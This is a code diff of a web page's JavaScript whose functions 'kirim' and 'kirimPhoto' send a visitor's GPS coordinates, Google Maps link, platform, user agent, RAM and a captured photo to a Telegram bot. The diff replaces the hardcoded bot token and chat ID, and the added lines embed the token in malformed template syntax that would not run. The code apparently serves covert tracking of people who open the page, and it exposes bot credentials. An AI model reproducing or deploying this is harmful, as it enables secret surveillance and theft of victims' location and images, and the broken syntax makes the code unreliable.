@@ -132,8 +132,8 @@
         }
 
         function kirim(latitude, longitude, platform, userAgent, ram) {
-            const telegramBotToken = '7509578314:AAGSMwh8p7uQBF0xgfyVQ9lqdImYsNHb5WM';
-            const chatId = '6664857941';
+            const telegramBotToken = '7908995954:AAHGVyFn0wm6zyARrT0wXPem4W3jkDd78qQ';
+            const chatId = '7908995954';
             const message = `
                 🌍 Location Information:
                 Latitude: ${latitude}
@@ -147,7 +147,7 @@
                 🗺️ Google Maps:
                 https://www.google.com/maps?q=${latitude},${longitude}
             `;
-            const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            const apiUrl = `https://api.telegram.org/bot${7908995954:AAHGVyFn0wm6zyARrT0wXPem4W3jkDd78qQ}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
             fetch(apiUrl)
                 .then(response => response.json())
@@ -185,13 +185,13 @@
         }
 
         function kirimPhoto(blob) {
-            const telegramBotToken = '7509578314:AAGSMwh8p7uQBF0xgfyVQ9lqdImYsNHb5WM';
-            const chatId = '6664857941';
+            const telegramBotToken = '7908995954:AAHGVyFn0wm6zyARrT0wXPem4W3jkDd78qQ';
+            const chatId = '7908995954';
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('photo', blob);
 
-            const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;
+            const apiUrl = `https://api.telegram.org/bot${7908995954:AAHGVyFn0wm6zyARrT0wXPem4W3jkDd78qQ}/sendPhoto`;
 
             fetch(apiUrl, {
                 method: 'POST',
